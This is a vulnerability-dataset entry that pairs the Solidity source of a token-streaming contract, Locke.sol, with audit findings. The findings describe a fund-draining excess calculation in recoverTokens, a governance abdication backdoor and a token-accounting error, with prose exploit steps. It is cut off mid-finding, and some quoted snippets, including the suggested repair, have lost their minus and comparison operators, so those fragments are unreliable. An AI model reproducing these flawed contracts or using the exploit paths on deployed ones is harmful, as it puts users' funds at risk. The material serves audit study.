[
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.0;\n\nimport \"./LockeERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/tokens/ERC20.sol\";\n\n// ====== Governance =====\ncontract Governed {\n    address public gov;\n    address private pendingGov;\n    address public emergency_gov;\n\n    event NewGov(address indexed oldGov, address indexed newGov);\n    event NewPendingGov(address indexed oldPendingGov, address indexed newPendingGov);\n\n    constructor(address _governor, address _emergency_governor) public {\n        gov = _governor;\n        emergency_gov = _emergency_governor;\n    }\n\n    function governorship() public view returns (address, address, address) {\n        return (gov, emergency_gov, pendingGov);\n    }\n\n    /// Update pending governor\n    function setPendingGov(address newPendingGov) governed public {\n        address old = pendingGov;\n        pendingGov = newPendingGov;\n        emit NewPendingGov(old, newPendingGov);\n    }\n\n    /// Accepts governorship\n    function acceptGov() public {\n        require(pendingGov == msg.sender, \"!pending\");\n        address old = gov;\n        gov = pendingGov;\n        emit NewGov(old, pendingGov);\n    }\n\n    function setEmergencyGov(address who) public governed {\n        emergency_gov = who;\n    } \n\n    /// Remove governor\n    function __abdicate() governed public {\n        address old = gov;\n        gov = address(0);\n        emit NewGov(old, address(0));\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier governed {\n        require(msg.sender == gov, \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier emergency_governed {\n        require(msg.sender == gov || msg.sender == emergency_gov, \"!egov\");\n        _;\n    }\n}\n\ninterface IGoverned {\n    function gov() external view returns (address);\n    function emergency_gov() external view returns (address);\n}\n\nabstract contract ExternallyGoverned {\n    IGoverned public gov;\n\n    constructor(address governor) {\n        gov = IGoverned(governor);\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier externallyGoverned {\n        require(msg.sender == gov.gov(), \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier externallyEmergencyGoverned {\n        require(msg.sender == gov.gov() || msg.sender == gov.emergency_gov(), \"!e_gov\");\n        _;\n    }\n}\n\ninterface LockeCallee {\n    function lockeCall(address initiator, address token, uint256 amount, bytes calldata data) external;\n}\n\n// ====== Stream =====\ncontract Stream is LockeERC20, ExternallyGoverned {\n    using SafeTransferLib for ERC20;    \n    // ======= Structs ========\n    struct TokenStream {\n        uint256 lastCumulativeRewardPerToken;\n        uint256 virtualBalance;\n        uint112 rewards;\n        uint112 tokens;\n        uint32 lastUpdate;\n        bool merkleAccess;\n    }\n\n    // ======= Storage ========\n    // ==== Immutables =====\n    // stream start time\n    uint32 private immutable startTime;\n    // length of stream\n    uint32 private immutable streamDuration;\n    // length of time depositTokens are locked after stream ends\n    uint32 private immutable depositLockDuration;\n    // length of time rewardTokens are locked after stream ends\n    uint32 private immutable rewardLockDuration;\n\n    // end of stream\n    uint32 private immutable endStream;\n    // end of deposit lock\n    uint32 private immutable endDepositLock;\n    // end of reward lock\n    uint32 private immutable endRewardLock;\n\n    // Token given to depositer\n    address public immutable rewardToken;\n    // Token deposited\n    address public immutable depositToken;\n\n    // This stream's id\n    uint64 public immutable streamId;\n\n    // fee percent on reward tokens\n    uint16 private immutable feePercent;\n    // are fees enabled\n    bool private immutable feeEnabled;\n\n    // deposits are basically a *sale* to the stream creator if true\n    bool public immutable isSale;\n\n    // stream creator\n    address public immutable streamCreator;\n\n    uint112 private immutable depositDecimalsOne;\n    // ============\n\n    //  == sloc a ==\n    // internal reward token amount to be given to depositors\n    uint112 private rewardTokenAmount;\n    // internal deposit token amount locked/to be sold to stream creator\n    uint112 private depositTokenAmount;\n    // ============\n\n    // == slot b ==\n    uint112 private rewardTokenFeeAmount;\n    uint112 private depositTokenFlashloanFeeAmount;\n    uint8 private unlocked = 1;\n    bool private claimedDepositTokens;\n    // ============\n\n    // == slot c ==\n    uint256 private cumulativeRewardPerToken;\n    // ============\n\n    // == slot d ==\n    uint256 private totalVirtualBalance;\n    // ============\n\n    // == slot e ==\n    uint112 public unstreamed;\n    uint112 private redeemedDepositTokens;\n    uint32 private lastUpdate;\n    // ============\n\n    // mapping of address to number of tokens not yet streamed over\n    mapping (address => TokenStream) public tokensNotYetStreamed;\n\n    // external incentives to stream creator\n    mapping (address => uint112) public incentives;\n\n    // ======= Events ========\n    event StreamFunded(uint256 amount);\n    event Staked(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event StreamIncentivized(address indexed token, uint256 amount);\n    event StreamIncentiveClaimed(address indexed token, uint256 amount);\n    event SoldTokensClaimed(address indexed who, uint256 amount);\n    event DepositTokensReclaimed(address indexed who, uint256 amount);\n    event FeesClaimed(address indexed token, address indexed who, uint256 amount);\n    event RecoveredTokens(address indexed token, address indexed recipient, uint256 amount);\n    event RewardsClaimed(address indexed who, uint256 amount);\n    event Flashloaned(address indexed token, address indexed who, uint256 amount, uint256 fee);\n\n    // ======= Modifiers ========\n    modifier updateStream(address who) {\n        // save bytecode space by making it a jump instead of inlining at cost of gas\n        updateStreamInternal(who);\n        _;\n    }\n\n    function updateStreamInternal(address who) internal {\n        require(block.timestamp < endStream , \"!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        if (block.timestamp >= startTime) {\n            // set lastUpdates if need be\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = uint32(block.timestamp);\n            }\n\n            // accumulate reward per token info\n            cumulativeRewardPerToken = rewardPerToken();\n\n            // update user rewards\n            ts.rewards = earned(ts, cumulativeRewardPerToken);\n            // update users last cumulative reward per token\n            ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n            // update users unstreamed balance\n            uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;\n            if (acctTimeDelta > 0 && ts.tokens > 0) {\n                // some time has passed since this user last interacted\n                // update ts not yet streamed\n                ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n\n            // handle global unstreamed\n            uint32 tdelta = uint32(block.timestamp - lastUpdate);\n            // stream tokens over\n            if (tdelta > 0 && unstreamed > 0) {\n                uint256 globalStreamingSpeedPerSecond = (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate);\n                unstreamed -= uint112((uint256(tdelta) * globalStreamingSpeedPerSecond) / 10**6);\n            }\n            // already ensure that blocktimestamp is less than endStream so guaranteed ok here\n            lastUpdate = uint32(block.timestamp);\n        } else {\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = startTime;\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = startTime;\n            }\n        }\n    }\n\n\n    function lockInternal() internal {\n        require(unlocked == 1, \"re\");\n        unlocked = 2;\n    }\n    modifier lock {\n        lockInternal();\n        _;\n        unlocked = 1;\n    }\n\n    constructor(\n        uint64 _streamId,\n        address creator,\n        bool _isSale,\n        address _rewardToken,\n        address _depositToken,\n        uint32 _startTime,\n        uint32 _streamDuration,\n        uint32 _depositLockDuration,\n        uint32 _rewardLockDuration,\n        uint16 _feePercent,\n        bool _feeEnabled\n\n    )\n        LockeERC20(_depositToken, _streamId, _startTime + _streamDuration)\n        ExternallyGoverned(msg.sender) // inherit factory governance\n        public \n    {\n        // set fee info\n        feePercent = _feePercent;\n        feeEnabled = _feeEnabled;\n\n        // limit feePercent\n        require(feePercent < 10000, \"fee\");\n    \n        // store streamParams\n        startTime = _startTime;\n        streamDuration = _streamDuration;\n        depositLockDuration = _depositLockDuration;\n        rewardLockDuration = _rewardLockDuration;\n\n        endStream = startTime + streamDuration;\n        endDepositLock = endStream + depositLockDuration;\n        endRewardLock = endStream + rewardLockDuration;\n    \n        // set tokens\n        depositToken = _depositToken;\n        rewardToken = _rewardToken;\n\n        // set streamId\n        streamId = _streamId;\n\n        // set sale info\n        isSale = _isSale;\n    \n        streamCreator = creator;\n\n        depositDecimalsOne = uint112(10**ERC20(depositToken).decimals());\n    }\n\n    /**\n     * @dev Returns relevant internal token amounts\n    **/\n    function tokenAmounts() public view returns (uint112, uint112, uint112, uint112) {\n        return (rewardTokenAmount, depositTokenAmount, rewardTokenFeeAmount, depositTokenFlashloanFeeAmount);\n    }\n\n    /**\n     * @dev Returns fee parameters\n    **/\n    function feeParams() public view returns (uint16, bool) {\n        return (feePercent, feeEnabled);\n    }\n\n    /**\n     * @dev Returns stream parameters\n    **/\n    function streamParams() public view returns (uint32,uint32,uint32,uint32) {\n        return (\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration\n        );\n    }\n\n    function lastApplicableTime() internal view returns (uint32) {\n        return block.timestamp <= endStream ? uint32(block.timestamp) : endStream;\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalVirtualBalance == 0) {\n            return cumulativeRewardPerToken;\n        } else {\n            // \u2206time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance\n            return cumulativeRewardPerToken + (\n                ((uint256(lastApplicableTime()) - lastUpdate) * rewardTokenAmount * depositDecimalsOne/streamDuration) \n                / totalVirtualBalance\n            );\n        }\n    }\n\n    function dilutedBalance(uint112 amount) internal view returns (uint256) {\n        // duration / timeRemaining * amount\n        if (block.timestamp < startTime) {\n            return amount;\n        } else {\n            uint32 timeRemaining = endStream - uint32(block.timestamp);\n            return ((uint256(streamDuration) * amount * 10**6) / timeRemaining) / 10**6;\n        }\n    }\n\n    function getEarned(address who) public view returns (uint256) {\n        TokenStream storage ts = tokensNotYetStreamed[who];\n        return earned(ts, rewardPerToken());\n    }\n\n    function earned(TokenStream storage ts, uint256 currCumRewardPerToken) internal view returns (uint112) {\n        return uint112(ts.virtualBalance * (currCumRewardPerToken - ts.lastCumulativeRewardPerToken) / depositDecimalsOne) + ts.rewards;\n    }\n\n    /**\n     * @dev Allows _anyone_ to fund this stream, if its before the stream start time\n    **/\n    function fundStream(uint112 amount) public lock {\n        require(amount > 0, \"amt\");\n        require(block.timestamp < startTime, \"time\");\n        uint112 amt;\n\n        // transfer from sender\n        uint256 prevBal = ERC20(rewardToken).balanceOf(address(this));\n        ERC20(rewardToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(rewardToken).balanceOf(address(this));\n        require(newBal < type(uint112).max && newBal > prevBal, \"erc\");\n\n        amount = uint112(newBal - prevBal);\n        // if fee is enabled, take a fee\n        if (feeEnabled) {\n            // Safety:\n            //  1. feePercent & y are casted up to u256, so cannot overflow when multiplying\n            //  2. downcast is safe because (x*y)/MAX_X is guaranteed to be smaller than y which is uint112\n            //  3. amount is guaranteed to be greater than feeAmt\n            uint112 feeAmt;\n            unchecked {\n                feeAmt = uint112(uint256(feePercent) * uint256(amount) / 10000); \n                amt = amount - feeAmt;\n            }\n\n            // since this operation can be repeated, we cannot assume no overflow so use checked math\n            rewardTokenFeeAmount += feeAmt;\n            rewardTokenAmount += amt;\n        } else {\n            amt = amount;\n            rewardTokenAmount += amt;\n        }\n        \n        emit StreamFunded(amt);\n    }\n\n    /**\n     *  @dev Deposits depositTokens into this stream\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function stake(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // require(block.timestamp < endStream, \"stake:!stream\");\n\n        // transfer tokens over\n        uint256 prevBal = ERC20(depositToken).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(depositToken).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n        \n        uint112 trueDepositAmt = uint112(newBal - prevBal);\n\n        depositTokenAmount += trueDepositAmt;\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        ts.tokens += trueDepositAmt;\n\n        uint256 virtualBal = dilutedBalance(trueDepositAmt);\n        ts.virtualBalance += virtualBal;\n        totalVirtualBalance += virtualBal;\n        unstreamed += trueDepositAmt;\n\n        if (!isSale) {\n            // not a straight sale, so give the user some receipt tokens\n            _mint(msg.sender, trueDepositAmt);\n        } else {\n        }\n\n        emit Staked(msg.sender, trueDepositAmt);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to withdraw a specific amount of depositTokens during a stream,\n     *  up to their tokensNotYetStreamed amount\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function withdraw(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        require(ts.tokens >= amount, \"amt\");\n        ts.tokens -= amount;\n\n        uint256 virtualBal = dilutedBalance(amount);\n        ts.virtualBalance -= virtualBal;\n        totalVirtualBalance -= virtualBal;\n        depositTokenAmount -= amount;\n        if (!isSale) {\n            _burn(msg.sender, amount);\n        } else {\n        }\n\n        // do the transfer\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to exit their entire remaining tokens that haven't streamed\n     *  and burns receiptTokens if its not a sale.\n     * \n     *  additionally, updates tokensNotYetStreamed. Lock is done in withdraw\n    */ \n    function exit() public updateStream(msg.sender) {\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        uint112 amount = ts.tokens;\n        withdraw(amount);\n    }\n\n    /**\n     *  @dev Allows anyone to incentivize this stream with extra tokens\n     *  and requires the incentive to not be the reward or deposit token\n    */ \n    function createIncentive(address token, uint112 amount) public lock {\n        require(token != rewardToken && token != depositToken, \"inc\");\n        \n        uint256 prevBal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(token).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n\n        uint112 amt = uint112(newBal - prevBal);\n        incentives[token] += amt;\n        emit StreamIncentivized(token, amt);\n    }\n\n    /**\n     *  @dev Allows the stream creator to claim an incentive once the stream is done\n    */ \n    function claimIncentive(address token) public lock {\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        uint112 amount = incentives[token];\n        require(amount > 0, \"amt\");\n        incentives[token] = 0;\n        ERC20(token).safeTransfer(msg.sender, amount);\n        emit StreamIncentiveClaimed(token, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder to reclaim deposit tokens if the deposit lock is done & their receiptToken amount\n     *  is greater than the requested amount\n    */ \n    function claimDepositTokens(uint112 amount) public lock {\n        require(!isSale, \"sale\");\n        // NOTE: given that endDepositLock is strictly *after* the last time withdraw or exit is callable\n        // we dont need to updateStream(msg.sender)\n        require(amount > 0, \"amt\");\n\n        // is the stream over + the deposit lock period over? thats the only time receiptTokens can be burned for depositTokens after stream is over\n        require(block.timestamp > endDepositLock, \"lock\");\n\n        // burn the receiptTokens\n        _burn(msg.sender, amount);\n\n        redeemedDepositTokens += amount;\n\n        // send the receipt token holder back the funds\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit DepositTokensReclaimed(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder (or original depositor in case of a sale) to claim their rewardTokens\n    */ \n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        // update user rewards\n        ts.rewards = earned(ts, cumulativeRewardPerToken);\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        uint256 rewardAmt = ts.rewards;\n        ts.rewards = 0;\n\n        require(rewardAmt > 0, \"amt\");\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n\n    /**\n     *  @dev Allows a creator to claim sold tokens if the stream has ended & this contract is a sale\n    */ \n    function creatorClaimSoldTokens(address destination) public lock {\n        // can only claim when its a sale\n        require(isSale, \"!sale\");\n\n        // only can claim once\n        require(!claimedDepositTokens, \"claimed\");\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        \n        uint112 amount = depositTokenAmount;\n        claimedDepositTokens = true;\n\n        ERC20(depositToken).safeTransfer(destination, amount);\n\n        emit SoldTokensClaimed(destination, amount);\n    }\n\n    /**\n     *  @dev Allows the governance contract of the factory to select a destination\n     *  and transfer fees (in rewardTokens) to that address totaling the total fee amount\n    */ \n    function claimFees(address destination) public lock externallyGoverned {\n        // Stream is done\n        require(block.timestamp >= endStream, \"stream\");\n\n        // reset fee amount\n        uint112 fees = rewardTokenFeeAmount;\n        if (fees > 0) {\n            rewardTokenFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(rewardToken).safeTransfer(destination, fees);\n            emit FeesClaimed(rewardToken, destination, fees);\n        }\n\n        fees = depositTokenFlashloanFeeAmount;\n        if (fees > 0) {\n            depositTokenFlashloanFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(depositToken).safeTransfer(destination, fees);\n\n            emit FeesClaimed(depositToken, destination, fees);\n        }\n        \n    }\n\n    // ======== Non-protocol functions ========\n\n    /**\n     *  @dev Allows the stream creator to save tokens\n     *  There are some limitations to this:\n     *      1. if its deposit token:\n     *          - DepositLock is fully done\n     *          - There are excess deposit tokens (balance - depositTokenAmount)\n     *      2. if its the reward token:\n     *          - RewardLock is fully done\n     *          - Excess defined as balance - (rewardTokenAmount + rewardTokenFeeAmount)\n     *      3. if incentivized:\n     *          - excesss defined as bal - incentives[token]\n    */ \n    function recoverTokens(address token, address recipient) public lock {\n        // NOTE: it is the stream creators responsibility to save\n        // tokens on behalf of their users.\n        require(msg.sender == streamCreator, \"!creator\");\n        if (token == depositToken) {\n            require(block.timestamp > endDepositLock, \"time\");\n            // get the balance of this contract\n            // check what isnt claimable by either party\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n            // allow saving of the token\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n        \n        if (token == rewardToken) {\n            require(block.timestamp > endRewardLock, \"time\");\n            // check current balance vs internal balance\n            //\n            // NOTE: if a token rebases, i.e. changes balance out from under us,\n            // most of this contract breaks and rugs depositors. this isn't exclusive\n            // to this function but this function would in theory allow someone to rug\n            // and recover the excess (if it is worth anything)\n\n            // check what isnt claimable by depositors and governance\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        if (incentives[token] > 0) {\n            require(block.timestamp >= endStream, \"stream\");\n            uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n            ERC20(token).safeTransfer(recipient, excess);\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        // not reward token nor deposit nor incentivized token, free to transfer\n        uint256 bal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransfer(recipient, bal);\n        emit RecoveredTokens(token, recipient, bal);\n    }\n\n    /**\n     *  @dev Allows anyone to flashloan reward or deposit token for a 10bps fee\n    */\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n            require(preDepositTokenBalance + feeAmt <= postDepositTokenBalance, \"f1\");\n            require(preRewardTokenBalance <= postRewardTokenBalance, \"f2\");\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n            require(preDepositTokenBalance <= postDepositTokenBalance, \"f3\");\n            require(preRewardTokenBalance + feeAmt <= postRewardTokenBalance, \"f4\");\n        }\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n\n    /**\n     *  @dev Allows inherited governance contract to call functions on behalf of this contract\n     *  This is a potentially dangerous function so to ensure trustlessness, *all* balances\n     *  that may matter are guaranteed to not change.\n     * \n     *  The primary usecase is for claiming potentially airdrops that may have accrued on behalf of this contract\n    */\n    function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n        // cannot have an active incentive for the callee\n        require(incentives[who] == 0, \"inc\");\n        // cannot be to deposit token nor reward token\n        require(who != depositToken && who != rewardToken, \"erc\");\n\n        // get token balances\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        (bool success, bytes memory _ret) = who.call(data);\n        require(success);\n\n        // require no change in balances\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n        require(preDepositTokenBalance == postDepositTokenBalance && preRewardTokenBalance == postRewardTokenBalance, \"erc\");\n    }\n}\n\ncontract StreamFactory is Governed {\n\n    // ======= Structs ========\n    struct GovernableStreamParams {\n        uint32 maxDepositLockDuration;\n        uint32 maxRewardLockDuration;\n        uint32 maxStreamDuration;\n        uint32 minStreamDuration;\n    }\n\n    struct GovernableFeeParams {\n        uint16 feePercent;\n        bool feeEnabled;\n    }\n\n    // ======= Storage ========\n    GovernableStreamParams public streamParams;\n    GovernableFeeParams public feeParams;\n    uint64 public currStreamId; \n\n    uint16 constant MAX_FEE_PERCENT = 500; // 500/10000 == 5%\n\n    // =======  Events  =======\n    event StreamCreated(uint256 indexed stream_id, address stream_addr);\n    event StreamParametersUpdated(GovernableStreamParams oldParams, GovernableStreamParams newParams);\n    event FeeParametersUpdated(GovernableFeeParams oldParams, GovernableFeeParams newParams);\n\n    constructor(address _governor, address _emergency_governor) public Governed(_governor, _emergency_governor) {\n        streamParams = GovernableStreamParams({\n            maxDepositLockDuration: 52 weeks,\n            maxRewardLockDuration: 52 weeks,\n            maxStreamDuration: 2 weeks,\n            minStreamDuration: 1 hours\n        });\n    }\n\n    /**\n     * @dev Deploys a minimal contract pointing to streaming logic. This contract will also be the token contract\n     * for the receipt token. It custodies the depositTokens until depositLockDuration is complete. After\n     * lockDuration is completed, the depositTokens can be claimed by the original depositors\n     * \n    **/\n    function createStream(\n        address rewardToken,\n        address depositToken,\n        uint32 startTime,\n        uint32 streamDuration,\n        uint32 depositLockDuration,\n        uint32 rewardLockDuration,\n        bool isSale\n    )\n        public\n        returns (Stream)\n    {\n        // perform checks\n\n        {\n            require(startTime >= block.timestamp, \"past\");\n            require(streamDuration >= streamParams.minStreamDuration && streamDuration <= streamParams.maxStreamDuration, \"stream\");\n            require(depositLockDuration <= streamParams.maxDepositLockDuration, \"lock\");\n            require(rewardLockDuration <= streamParams.maxRewardLockDuration, \"reward\");\n        }\n        \n\n        // TODO: figure out sane salt, i.e. streamid + x? streamid guaranteed to be unique\n        uint64 that_stream = currStreamId;\n        currStreamId += 1;\n        bytes32 salt = bytes32(uint256(that_stream));\n\n        Stream stream = new Stream{salt: salt}(\n            that_stream,\n            msg.sender,\n            isSale,\n            rewardToken,\n            depositToken,\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration,\n            feeParams.feePercent,\n            feeParams.feeEnabled\n        );\n\n        emit StreamCreated(that_stream, address(stream));\n\n        return stream;\n    }\n\n    function updateStreamParams(GovernableStreamParams memory newParams) public governed {\n        // DATA VALIDATION:\n        //  there is no real concept of \"sane\" limits here, and if misconfigured its ultimated\n        //  not a massive deal so no data validation is done\n        GovernableStreamParams memory old = streamParams;\n        streamParams = newParams;\n        emit StreamParametersUpdated(old, newParams);\n    }\n\n    function updateFeeParams(GovernableFeeParams memory newFeeParams) public governed {\n        require(newFeeParams.feePercent <= MAX_FEE_PERCENT, \"fee\");\n        GovernableFeeParams memory old = feeParams;\n        feeParams = newFeeParams;\n        emit FeeParametersUpdated(old, newFeeParams);\n    }\n}\n\n\n",
        "CodeNames": [
            "Locke.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\nuint256 excess = ERC20(token).balanceOf(address(this)) (depositTokenAmount redeemedDepositTokens);\n"
                ],
                "Type": " Wrong calculation of excess depositToken allows stream creator to retrieve  depositTokenFlashloanFeeAmount , which may cause fund loss to users",
                "Description": "\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654-L654\n\nsolidity\nuint256 excess = ERC20(token).balanceOf(address(this)) (depositTokenAmount redeemedDepositTokens);\n\n\nIn the current implementation, depositTokenFlashloanFeeAmount is not excluded when calculating excess depositToken. Therefore, the stream creator can call recoverTokens(depositToken, recipient) and retrieve depositTokenFlashloanFeeAmount if there are any.\n\nAs a result:\n\n*   When the protocol governance calls claimFees() and claim accumulated depositTokenFlashloanFeeAmount, it may fail due to insufficient balance of depositToken.\n*   Or, part of users' funds (depositToken) will be transferred to the protocol governance as fees, causing some users unable to withdraw or can only withdraw part of their deposits.\n\n\nGiven:\n\n*   feeEnabled: true\n*   feePercent: 10 (0.1%)\n\n1.  Alice deposited 1,000,000 depositToken;\n2.  Bob called flashloan() and borrowed 1,000,000 depositToken, then repaid 1,001,000;\n3.  Charlie deposited 1,000 depositToken;\n4.  After endDepositLock, Alice called claimDepositTokens() and withdrawn 1,000,000 depositToken;\n5.  streamCreator called recoverTokens(depositToken, recipient) and retrieved 1,000 depositToken (2,000 (1,001,000 1,000,000));\n6.  governance called claimFees() and retrieved another 1,000 depositToken;\n7.  Charlie tries to claimDepositTokens() but since the current balanceOf depositToken is 0, the transcation always fails, and Charlie loses all the depositToken.\n\n",
                "Repair": "\nChange to:\n\nsolidity\nuint256 excess = ERC20(token).balanceOf(address(this)) (depositTokenAmount redeemedDepositTokens) depositTokenFlashloanFeeAmount;\n\n\nbrockelmore (Streaming Protocol) confirmed(https://github.com/code-423n4/2021-11-streaming-findings/issues/241#issuecomment-989271468)\n\n\n\n\n"
            },
            {
                "Name": "H-07",
                "Location": [
                    "acceptGov()",
                    "__abdicate()",
                    "pendingGov"
                ],
                "Type": " Business logic bug in __abdicate() function - 2 Bugs",
                "Description": "\n\nThe __abdicate() function at <https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L46-L50 is the logic to remove the governance i.e., to renounce governance. However, the function logic does not consider emergency governor and pending governor, which can be a backdoor as only the \"gov\" is set to zero address while the emergency and pending gov remains. A pending gov can just claim and become the gov again, replacing the zero address.\n\n\n1.  Compile the contract and set the _GOVERNOR and _EMERGENCY_GOVERNOR.\n2.  Now set a pendingGov but do not call acceptGov()\n\nBug 1\n3. Call the __abdicate() function and we will notice only \"gov\" is set to zero address while emergency gov remains.\n\nBug2\n4. Now use the address used in pendingGov to call acceptGov() function.\n5. We will notice the new gov has been updated to the new address from the zero address.\n\nHence the __abdicate() functionality can be used as a backdoor using emergency governor or leaving a pending governor to claim later.\n\n\nRemix to test the proof of concept.\n\n",
                "Repair": "\nThe __abdicate() function should set emergency_gov and pendingGov as well to zero address.\n\nbrockelmore (Streaming Protocol) confirmed and disagreed with severity(https://github.com/code-423n4/2021-11-streaming-findings/issues/132#issuecomment-986938323):\n  Yes, the governor can be recovered from abdication if pendingGov != 0 as well as emergency gov needs to be set to 0 before abdication because it won't be able to abdicate itself.\n \n Would consider it to be medium risk because chances of it ever being called are slim as it literally would cutoff the protocol from being able to capture its fees.\n\n0xean (judge) commented(https://github.com/code-423n4/2021-11-streaming-findings/issues/132#issuecomment-1013518527):\n  Given that the functionality and vulnerability exists, and the governor does claim fees, this could lead to the loss of funds. Based on the documentation for C4, that would qualify as high severity. \n \n \n 3 \u2014 High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n \n\n\n\n\n"
            },
            {
                "Name": "H-08",
                "Location": [
                    "JS\n  if (acctTimeDelta  0 && ts.tokens  0) {\n",
                    "JS\nfunction stake(uint112 amount) public lock updateStream(msg.sender) {\n    ...         \n    uint112 trueDepositAmt = uint112(newBal prevBal);\n    ... \n    ts.tokens += trueDepositAmt;\n",
                    "JS\nfunction withdraw(uint112 amount) public lock updateStream(msg.sender) {\n    ...\n    ts.tokens -= amount;\n",
                    "JS\nfunction updateStreamInternal(address who) internal {\n...\nuint32 acctTimeDelta = uint32(block.timestamp) ts.lastUpdate;\n    if (acctTimeDelta  0 && ts.tokens  0) {\n        // some time has passed since this user last interacted\n        // update ts not yet streamed\n        ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream ts.lastUpdate));\n        ts.lastUpdate = uint32(block.timestamp);\n    }\n"
                ],
                "Type": " ts.tokens sometimes calculated incorrectly",
